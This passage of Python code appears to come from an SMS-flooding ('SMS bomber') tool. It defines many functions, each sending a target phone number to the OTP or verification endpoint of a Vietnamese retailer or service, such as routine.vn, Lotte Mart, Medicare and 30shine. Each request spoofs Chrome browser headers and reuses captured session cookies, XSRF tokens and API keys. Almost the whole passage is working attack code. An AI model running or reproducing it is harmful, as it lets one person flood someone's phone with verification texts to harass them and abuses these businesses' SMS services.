        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
        'type': 'register',
    }

    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
def beaty_live(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': 'a0a128f4e822ffbb9607c9012e90b102',
        'origin': 'https://beautybox.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://beautybox.com.vn/',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1716203261528',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    }

    json_data = {
        'phoneNumber': '84'+phone,
    }

    response = requests.post(
        'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification',
        headers=headers,
        json=json_data,
    )
def routine_live(phone):
    cookies = {
        '_gcl_au': '1.1.1684925236.1716203416',
        'AMP_MKTG_d92ebfa0f9': 'JTdCJTdE',
        '_ga_JZNCRNC4SL': 'GS1.1.1716203416.1.0.1716203416.60.0.0',
        '_ga': 'GA1.1.148927237.1716203417',
        'cto_bundle': '9B2NqF92WkslMkZOemV5ZzhhdzZzWFA2OUxMdmpuSmdLUzYlMkZ2N2FFMkdSejJnTXhUMUFYT3ZRcW8wdkpIZTY0Z012NjBQNjh5Sm5WM0NwYmVkTHAyUHVRNXZvJTJGQ3VKTm9zRFVLJTJCWUgzazIxSmhyd1NaeXdRR2JxTmFWNGR5OWJLR0tRbzl3WGdhVzZRS2w5T2VxSzRvSnlPTHpVZyUzRCUzRA',
        '_tt_enable_cookie': '1',
        '_ttp': 'mztCkBSkz3-4V9zYHZgCm0nVwqi',
        '_fbp': 'fb.1.1716203417607.1026093760',
        'wp_ga4_customerGroup': 'NOT%20LOGGED%20IN',
        'X-Magento-Vary': '7ad851671356eb8fbf873fbdb216dde0a2e0c003',
        'form_key': 'PzMWkONYgmBKSC5G',
        '_clck': '6a818w%7C2%7Cflx%7C0%7C1601',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'form_key': 'PzMWkONYgmBKSC5G',
        '_clsk': '1jrwbtw%7C1716203418876%7C1%7C1%7Ct.clarity.ms%2Fcollect',
        '_ym_uid': '1716203419662121297',
        '_ym_d': '1716203419',
        'PHPSESSID': 'mbji2mccof29l629p5cduk16oi',
        'private_content_version': 'fe33375489c73a72805f6ec36ee66290',
        '_ym_isad': '2',
        'section_data_ids': '%7B%22messages%22%3A1716203401%2C%22customer%22%3A1716203400%7D',
        '_ym_visorc': 'w',
        'AMP_d92ebfa0f9': 'JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjI0YjY4NmUzMC02NWY5LTQ5ZmMtYjg2ZS1iOTk1MmJjMzU4Y2ElMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzE2MjAzNDE2NTQ2JTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTcxNjIwMzQzMDA4MiUyQyUyMmxhc3RFdmVudElkJTIyJTNBNSU3RA==',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_gcl_au=1.1.1684925236.1716203416; AMP_MKTG_d92ebfa0f9=JTdCJTdE; _ga_JZNCRNC4SL=GS1.1.1716203416.1.0.1716203416.60.0.0; _ga=GA1.1.148927237.1716203417; cto_bundle=9B2NqF92WkslMkZOemV5ZzhhdzZzWFA2OUxMdmpuSmdLUzYlMkZ2N2FFMkdSejJnTXhUMUFYT3ZRcW8wdkpIZTY0Z012NjBQNjh5Sm5WM0NwYmVkTHAyUHVRNXZvJTJGQ3VKTm9zRFVLJTJCWUgzazIxSmhyd1NaeXdRR2JxTmFWNGR5OWJLR0tRbzl3WGdhVzZRS2w5T2VxSzRvSnlPTHpVZyUzRCUzRA; _tt_enable_cookie=1; _ttp=mztCkBSkz3-4V9zYHZgCm0nVwqi; _fbp=fb.1.1716203417607.1026093760; wp_ga4_customerGroup=NOT%20LOGGED%20IN; X-Magento-Vary=7ad851671356eb8fbf873fbdb216dde0a2e0c003; form_key=PzMWkONYgmBKSC5G; _clck=6a818w%7C2%7Cflx%7C0%7C1601; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; form_key=PzMWkONYgmBKSC5G; _clsk=1jrwbtw%7C1716203418876%7C1%7C1%7Ct.clarity.ms%2Fcollect; _ym_uid=1716203419662121297; _ym_d=1716203419; PHPSESSID=mbji2mccof29l629p5cduk16oi; private_content_version=fe33375489c73a72805f6ec36ee66290; _ym_isad=2; section_data_ids=%7B%22messages%22%3A1716203401%2C%22customer%22%3A1716203400%7D; _ym_visorc=w; AMP_d92ebfa0f9=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjI0YjY4NmUzMC02NWY5LTQ5ZmMtYjg2ZS1iOTk1MmJjMzU4Y2ElMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzE2MjAzNDE2NTQ2JTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTcxNjIwMzQzMDA4MiUyQyUyMmxhc3RFdmVudElkJTIyJTNBNSU3RA==',
        'origin': 'https://routine.vn',
        'priority': 'u=1, i',
        'referer': 'https://routine.vn/',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'telephone': phone,
        'isForgotPassword': '0',
    }

    response = requests.post('https://routine.vn/customer/otp/send/', cookies=cookies, headers=headers, data=data)
def thefaceshop_live(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': '1257fafb67e47ef1044ba234b4f5aa9c',
        'origin': 'https://thefaceshop.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://thefaceshop.com.vn/',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1716203678237',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    }

    json_data = {
        'phoneNumber': '84'+phone,
    }

    response = requests.post(
        'https://tfs-api.hsv-tech.io/client/phone-verification/request-verification',
        headers=headers,
        json=json_data,
    )
def gumac_live(phone):
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://gumac.vn',
        'Referer': 'https://gumac.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', headers=headers, json=json_data)
def hoangphuc_live(phone):
    cookies = {
        'form_key': '3ydBcDXUKQ8N7As3',
        'mage-banners-cache-storage': '{}',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'PHPSESSID': '70a33ac9ddbc5fa0ee9f136708778450',
        'form_key': '3ydBcDXUKQ8N7As3',
        'mage-messages': '',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        '_pk_ref.564990520.6493': '%5B%22%22%2C%22%22%2C1716203985%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '_pk_ses.564990520.6493': '*',
        '_gcl_au': '1.1.154726846.1716203985',
        'au_id': '1491445480',
        '_ac_au_gt': '1716203967654',
        '_fbp': 'fb.1.1716203985524.766089033',
        '_ga': 'GA1.1.1394232985.1716203986',
        'cdp_session': '1',
        '_gcl_aw': 'GCL.1716203986.EAIaIQobChMIlMP--42chgMVdtBMAh3L-wCrEAAYASAAEgIHbfD_BwE',
        '_asm_visitor_type': 'r',
        'cdp_blocked_sid_16283549': 'true',
        'mage-cache-sessid': 'true',
        '_pk_id.564990520.6493': '1491445480.1716203985.1.1716204186.1716203985.',
        '_ga_48P0WR3P2C': 'GS1.1.1716203985.1.1.1716204186.59.0.0',
        '_ac_client_id': '1491445480.1716204168',
        '_asm_ss_view': '%7B%22time%22%3A1716203985497%2C%22sid%22%3A%222109373603074448%22%2C%22page_view_order%22%3A4%2C%22utime%22%3A%222024-05-20T11%3A23%3A06%22%2C%22duration%22%3A200877%7D',
        '_ac_an_session': 'zhzizjzqzgzkzgzlzjzgzjzkznznznzrzdziznzqziznznzmznzrzjzdzizkzizlzhzjznzizlzrzdzizdzizkzizlzhzjznzizlzrzdzizkzizlzhzjznzizlzrzdzizdzhznzdzhzd2f27zdzgzdzezizdzd321v272624',
        'private_content_version': '0498d355f50c4bcb89cfa9d787afd668',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'form_key=3ydBcDXUKQ8N7As3; mage-banners-cache-storage={}; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; PHPSESSID=70a33ac9ddbc5fa0ee9f136708778450; form_key=3ydBcDXUKQ8N7As3; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; _pk_ref.564990520.6493=%5B%22%22%2C%22%22%2C1716203985%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.564990520.6493=*; _gcl_au=1.1.154726846.1716203985; au_id=1491445480; _ac_au_gt=1716203967654; _fbp=fb.1.1716203985524.766089033; _ga=GA1.1.1394232985.1716203986; cdp_session=1; _gcl_aw=GCL.1716203986.EAIaIQobChMIlMP--42chgMVdtBMAh3L-wCrEAAYASAAEgIHbfD_BwE; _asm_visitor_type=r; cdp_blocked_sid_16283549=true; mage-cache-sessid=true; _pk_id.564990520.6493=1491445480.1716203985.1.1716204186.1716203985.; _ga_48P0WR3P2C=GS1.1.1716203985.1.1.1716204186.59.0.0; _ac_client_id=1491445480.1716204168; _asm_ss_view=%7B%22time%22%3A1716203985497%2C%22sid%22%3A%222109373603074448%22%2C%22page_view_order%22%3A4%2C%22utime%22%3A%222024-05-20T11%3A23%3A06%22%2C%22duration%22%3A200877%7D; _ac_an_session=zhzizjzqzgzkzgzlzjzgzjzkznznznzrzdziznzqziznznzmznzrzjzdzizkzizlzhzjznzizlzrzdzizdzizkzizlzhzjznzizlzrzdzizkzizlzhzjznzizlzrzdzizdzhznzdzhzd2f27zdzgzdzezizdzd321v272624; private_content_version=0498d355f50c4bcb89cfa9d787afd668',
        'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQxNzMwMTkiLCJhcCI6IjExMjAyMzc5NzIiLCJpZCI6ImM0NjY0M2NlZmE2ODRkMGQiLCJ0ciI6IjJjMzY2Zjk4YjgzOGZjYzU0YjVhYTI4NGY5ZTkxMzcwIiwidGkiOjE3MTYyMDQyMjY4MzEsInRrIjoiMTMyMjg0MCJ9fQ==',
        'origin': 'https://hoang-phuc.com',
        'priority': 'u=1, i',
        'referer': 'https://hoang-phuc.com/customer/account/create/',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-2c366f98b838fcc54b5aa284f9e91370-c46643cefa684d0d-01',
        'tracestate': '1322840@nr=0-1-4173019-1120237972-c46643cefa684d0d----1716204226831',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'x-newrelic-id': 'UAcAUlZSARABVFlaBQYEVlUD',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action_type': '1',
        'tel': phone,
    }

    response = requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', cookies=cookies, headers=headers, data=data)
def madia_live(phone):
    cookies = {
        '_gcl_au': '1.1.702367245.1716204352',
        '_fbp': 'fb.1.1716204352614.1164973944',
        'XSRF-TOKEN': 'eyJpdiI6IlQ2aS9GZ2pSRjY0cUZpSWI4Vmo3cUE9PSIsInZhbHVlIjoiTFZlS3BsRnJmeFh5ZklLSGc0ZmJrdU5Yd05ZblV3eEVmUVpCRnFtWmZxeDhjWHd5c0x1L1hpb0hvNXQ2R2c2TVFLMWp2YW92QlNOcmk1bnE1QVdEZDkzb25ISzdQWHd6RklBZWhqZng4Q1U0UEk3QmQvT0VzbXh2VGU3K2thUWEiLCJtYWMiOiIxZjBlZjhiMzkyZDNhOTYyNDgxYWI4YWYzZDY4ZjM3OWQzNWM2ZTRjODEzMGNjYTRmMTJkNTRlYTY0NTM4MDEwIiwidGFnIjoiIn0%3D',
        'medicare_session': 'eyJpdiI6Ind1U3J6SE1kREZjc0l2QTFqc3JBUFE9PSIsInZhbHVlIjoiTTV0eS9TRVRVUldpLzZ5YzNmZzJrOENFVnJobFFZRDJqUWxBU0N0N3d3emc5OEpqZGFMTzBIVmhxTyt0VkpDdnQzaHdkZE04eDlZdlJWS0JaallQUUxtUjNreldHeWF3NGtTcGp1cGppS2FYNVcwTVpsdUdUb05ST2g2bHpZU04iLCJtYWMiOiI0NWRmNzJhMWZmNTZlMjhiNmE3ODU3MDhkZGUxZDNiNmEwYWY2YWNmYzM0MmFjOWI3ZmRmNTc4NTI3NTgxZmYyIiwidGFnIjoiIn0%3D',
        '_ga_CEMYNHNKQ2': 'GS1.1.1716204352.1.1.1716204357.0.0.0',
        '_ga_8DLTVS911W': 'GS1.1.1716204352.1.1.1716204357.0.0.0',
        '_ga_R7XKMTVGEW': 'GS1.1.1716204352.1.1.1716204357.55.0.0',
        '_ga': 'GA1.2.2093753451.1716204352',
        '_gid': 'GA1.2.1046087486.1716204358',
        '_gat_gtag_UA_257373458_1': '1',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        # 'Cookie': '_gcl_au=1.1.702367245.1716204352; _fbp=fb.1.1716204352614.1164973944; XSRF-TOKEN=eyJpdiI6IlQ2aS9GZ2pSRjY0cUZpSWI4Vmo3cUE9PSIsInZhbHVlIjoiTFZlS3BsRnJmeFh5ZklLSGc0ZmJrdU5Yd05ZblV3eEVmUVpCRnFtWmZxeDhjWHd5c0x1L1hpb0hvNXQ2R2c2TVFLMWp2YW92QlNOcmk1bnE1QVdEZDkzb25ISzdQWHd6RklBZWhqZng4Q1U0UEk3QmQvT0VzbXh2VGU3K2thUWEiLCJtYWMiOiIxZjBlZjhiMzkyZDNhOTYyNDgxYWI4YWYzZDY4ZjM3OWQzNWM2ZTRjODEzMGNjYTRmMTJkNTRlYTY0NTM4MDEwIiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6Ind1U3J6SE1kREZjc0l2QTFqc3JBUFE9PSIsInZhbHVlIjoiTTV0eS9TRVRVUldpLzZ5YzNmZzJrOENFVnJobFFZRDJqUWxBU0N0N3d3emc5OEpqZGFMTzBIVmhxTyt0VkpDdnQzaHdkZE04eDlZdlJWS0JaallQUUxtUjNreldHeWF3NGtTcGp1cGppS2FYNVcwTVpsdUdUb05ST2g2bHpZU04iLCJtYWMiOiI0NWRmNzJhMWZmNTZlMjhiNmE3ODU3MDhkZGUxZDNiNmEwYWY2YWNmYzM0MmFjOWI3ZmRmNTc4NTI3NTgxZmYyIiwidGFnIjoiIn0%3D; _ga_CEMYNHNKQ2=GS1.1.1716204352.1.1.1716204357.0.0.0; _ga_8DLTVS911W=GS1.1.1716204352.1.1.1716204357.0.0.0; _ga_R7XKMTVGEW=GS1.1.1716204352.1.1.1716204357.55.0.0; _ga=GA1.2.2093753451.1716204352; _gid=GA1.2.1046087486.1716204358; _gat_gtag_UA_257373458_1=1',
        'Origin': 'https://medicare.vn',
        'Referer': 'https://medicare.vn/login',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'X-XSRF-TOKEN': 'eyJpdiI6IlQ2aS9GZ2pSRjY0cUZpSWI4Vmo3cUE9PSIsInZhbHVlIjoiTFZlS3BsRnJmeFh5ZklLSGc0ZmJrdU5Yd05ZblV3eEVmUVpCRnFtWmZxeDhjWHd5c0x1L1hpb0hvNXQ2R2c2TVFLMWp2YW92QlNOcmk1bnE1QVdEZDkzb25ISzdQWHd6RklBZWhqZng4Q1U0UEk3QmQvT0VzbXh2VGU3K2thUWEiLCJtYWMiOiIxZjBlZjhiMzkyZDNhOTYyNDgxYWI4YWYzZDY4ZjM3OWQzNWM2ZTRjODEzMGNjYTRmMTJkNTRlYTY0NTM4MDEwIiwidGFnIjoiIn0=',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'mobile': phone,
        'mobile_country_prefix': '84',
    }

    response = requests.post('https://medicare.vn/api/otp', cookies=cookies, headers=headers, json=json_data)
def acfc_live(phone):
    cookies = {
        'PHPSESSID': 'm1orfs13qsldhafp1th5it912e',
        '_evga_d955': '{%22uuid%22:%226f6fc5c91794f41f%22}',
        '_gcl_au': '1.1.749638493.1716204704',
        '_sfid_599e': '{%22anonymousId%22:%226f6fc5c91794f41f%22%2C%22consents%22:[]}',
        '_ga': 'GA1.1.1079541932.1716204704',
        '_fbp': 'fb.2.1716204704063.1174331123',
        'form_key': 'qVs787dP8DpMIb0L',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'mage-cache-sessid': 'true',
        '_tt_enable_cookie': '1',
        '_ttp': 'H0mSsxfdwSNfBUQ941DqNDSkIIn',
        'form_key': 'qVs787dP8DpMIb0L',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-messages': '',
        'optiMonkClientId': 'ebf7d7f0-fb30-1594-0350-e27f2127464e',
        'cto_bundle': 'rd5grV96QVFtUDBhNXhxWUNVU0ZGSUhOVmxzSDZ6USUyRnk5emZKbyUyQk9XQ0pCSG85MGV6b0dkTlBKRUJja1IyZyUyQmRqZ05aZ2htY3pFTjVSSFYlMkI0aXVpbmRPMHg0S1FQVGxmTGFyQ2RsWFNLUiUyRkglMkZuZWxmS1FTVVM0a3hTTHVVVWtrdThmQ3dKTUQ4dzVxbktmV0JjT3doSWpyZGclM0QlM0Q',
        '_ga_PS7MEHMFY3': 'GS1.1.1716204703.1.1.1716204708.55.0.0',
        'optiMonkClient': 'N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdjADYAmABgBYKY8AbYxMy2hpkAOwHsADmzBYsQA==',
        'optiMonkSession': '1716204694',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=m1orfs13qsldhafp1th5it912e; _evga_d955={%22uuid%22:%226f6fc5c91794f41f%22}; _gcl_au=1.1.749638493.1716204704; _sfid_599e={%22anonymousId%22:%226f6fc5c91794f41f%22%2C%22consents%22:[]}; _ga=GA1.1.1079541932.1716204704; _fbp=fb.2.1716204704063.1174331123; form_key=qVs787dP8DpMIb0L; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; _tt_enable_cookie=1; _ttp=H0mSsxfdwSNfBUQ941DqNDSkIIn; form_key=qVs787dP8DpMIb0L; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; optiMonkClientId=ebf7d7f0-fb30-1594-0350-e27f2127464e; cto_bundle=rd5grV96QVFtUDBhNXhxWUNVU0ZGSUhOVmxzSDZ6USUyRnk5emZKbyUyQk9XQ0pCSG85MGV6b0dkTlBKRUJja1IyZyUyQmRqZ05aZ2htY3pFTjVSSFYlMkI0aXVpbmRPMHg0S1FQVGxmTGFyQ2RsWFNLUiUyRkglMkZuZWxmS1FTVVM0a3hTTHVVVWtrdThmQ3dKTUQ4dzVxbktmV0JjT3doSWpyZGclM0QlM0Q; _ga_PS7MEHMFY3=GS1.1.1716204703.1.1.1716204708.55.0.0; optiMonkClient=N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdjADYAmABgBYKY8AbYxMy2hpkAOwHsADmzBYsQA==; optiMonkSession=1716204694',
        'origin': 'https://www.acfc.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.acfc.com.vn/customer/account/create/',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'number_phone': phone,
        'form_key': 'qVs787dP8DpMIb0L',
        'currentUrl': 'https://www.acfc.com.vn/customer/account/create/',
    }

    response = requests.post('https://www.acfc.com.vn/mgn_customer/customer/sendOTP', cookies=cookies, headers=headers, data=data)
def lotte_live(phone):
    cookies = {
        '_gcl_au': '1.1.348824714.1716204897',
        '__Host-next-auth.csrf-token': '51643f297a23901b9382accaa43ff0f35c0de957dad7c9a3d2ff648561a6d005%7Ccf71f3293ce67c4403db6a3cb6926414eb388bb81240c32c31982537c8dde9bb',
        '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.lottemart.vn',
        '_ga': 'GA1.1.707066455.1716204898',
        '_fbp': 'fb.1.1716204897937.1345621947',
        '_ga_6QLJ7DM4XW': 'GS1.1.1716204897.1.1.1716204920.37.0.0',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': '_gcl_au=1.1.348824714.1716204897; __Host-next-auth.csrf-token=51643f297a23901b9382accaa43ff0f35c0de957dad7c9a3d2ff648561a6d005%7Ccf71f3293ce67c4403db6a3cb6926414eb388bb81240c32c31982537c8dde9bb; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn; _ga=GA1.1.707066455.1716204898; _fbp=fb.1.1716204897937.1345621947; _ga_6QLJ7DM4XW=GS1.1.1716204897.1.1.1716204920.37.0.0',
        'origin': 'https://www.lottemart.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/vi-ptt',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    }

    json_data = {
        'username': phone,
        'case': 'register',
    }

    response = requests.post(
        'https://www.lottemart.vn/v1/p/mart/bos/vi_ptt/V1/mart-sms/sendotp',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def kingfood_live(phone):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        'domain': 'kingfoodmart',
        'origin': 'https://kingfoodmart.com',
        'priority': 'u=1, i',
        'referer': 'https://kingfoodmart.com/',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    }

    json_data = {
        'operationName': 'SendOTP',
        'variables': {
            'phone': phone,
        },
        'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
    }

    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)

def cat_live(phone):
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        'origin': 'https://30shine.com',
        'priority': 'u=1, i',
        'referer': 'https://30shine.com/',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post(
        'https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send',
        headers=headers,
        json=json_data,
    )
def patino(phone):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://pantio.vn',
        'priority': 'u=1, i',
        'referer': 'https://pantio.vn/',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    }

    params = {
        'domain': 'pantiofashion.myharavan.com',
    }

    data = {
        'phoneNumber': phone,
